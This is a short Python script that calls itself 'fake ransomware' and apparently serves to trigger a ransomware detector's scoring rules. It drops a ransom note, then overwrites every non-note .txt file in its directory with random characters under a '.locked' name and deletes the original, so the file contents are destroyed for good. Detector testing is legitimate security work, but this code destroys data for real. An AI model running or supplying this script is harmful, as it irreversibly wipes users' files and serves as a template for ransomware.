import os
import time
import random
import string

# The script will run in the current directory it's placed in
folder = "." 

print("Starting advanced fake ransomware...")

# 1. Drop a ransom note (Triggers +60 points)
with open(os.path.join(folder, "READ_ME_TO_DECRYPT.txt"), "w") as f:
    f.write("Your files are encrypted. Pay me.")
print("Dropped ransom note!")
time.sleep(1)

for filename in os.listdir(folder):
    if filename.endswith(".txt") and "READ_ME" not in filename:
        filepath = os.path.join(folder, filename)
        
        # Generate random garbage
        encrypted_data = ''.join(random.choices(string.ascii_letters + string.digits, k=2000))
        
        # Encrypt and rename (Triggers +40 points for entropy, +40 for extension)
        new_filepath = filepath + ".locked"
        with open(new_filepath, 'w') as f:
            f.write(encrypted_data)
        os.remove(filepath) 
        
        print(f"Encrypted and renamed: {filename} -> {filename}.locked")
        time.sleep(0.5) 
